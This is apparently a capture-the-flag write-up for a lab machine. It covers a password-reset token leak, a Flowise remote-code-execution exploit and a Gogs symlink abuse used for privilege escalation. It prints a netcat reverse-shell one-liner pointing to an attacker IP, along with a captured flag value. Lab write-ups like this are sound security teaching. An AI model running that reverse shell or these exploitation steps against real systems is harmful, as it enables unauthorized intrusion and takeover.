2  Initial Access

After adding the domain & subdomains to the hosts file and poking around a bit, the site seems to be pretty bare, though we do get some names near the bottom:

2.1  Resetting Ben's Password

Browsing to the the new subdomain greets us with a sign in prompt.

Selecting "Forgot password?" and entering an email shows that we can determine whether or not a user exists.

Attempting to use Ben's email from the original site results in obtaining a tempToken. This token looks like it should have been emailed to Ben to reset his password, rather than being returned to the client. This is CVE-2025-58434.

Using the reset password page with this token, we can reset Ben's password.

2.2  Flowise

Upon signing in with the new credentials, we are met with the home page. Here we can check the version of Flowise.

Doing some research, we can see there is an RCE exploit advisory affecting this version. The bearer token looks different than the cookie we received upon signing in. However, there is an API cookie that we could try to use:

Replacing the bearer token with the API key we obtained in the portal, and adjusting the payload, we see that the target does try to fetch our script.

Placing the following into rce.sh lets us gain a root shell:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh 2>&1 | nc 10.10.15.52 1337 > /tmp/f

Issuing the env command, we can see we are in a docker container and not on the actual host, and that we have some passwords.

2.2.1  User Flag

SSH with the SMTP_PASSWORD as the user ben grants us a login, and we get the first flag!

User Flag:

6f1f66f221f5f3cc157051eccc1a098f

3  Privilege Escalation

3.1  Go Git Server (Gogs)

Enumeration of running processes shows a gogs process running as root. We can see that the gogs process itself is running version 0.13.3. Some research shows that this version is vulnerable.

Checking the configuration for this process we find a new subdomain, staging-v2-code.dev.silentium.htb, for accessing this service.

To exploit this service, we're going to create a repository with a symlink to a file we want to write to on the target system. In this case, we're going to give Ben some sudo privileges.

With the subdomain added to our hosts file, we can start by registering a user and then creating a repository right after.

With the repository created, we can now clone it and add our symlink. This symlink does not need to be valid on our target system, we're going to abuse Gog's API to write to this file, the API itself will follow the symlink on the target system. The symlink just needs to be added to the repo first.

In order to abuse the API, we have to have an API token, so we just go to our profiles settings and create one. With the API token in hand, we can use the PUT method over curl to write the data we want to write.

The previous sudo -l command was issued prior to abusing the API. The following command was issued after, revealing that our exploit worked.
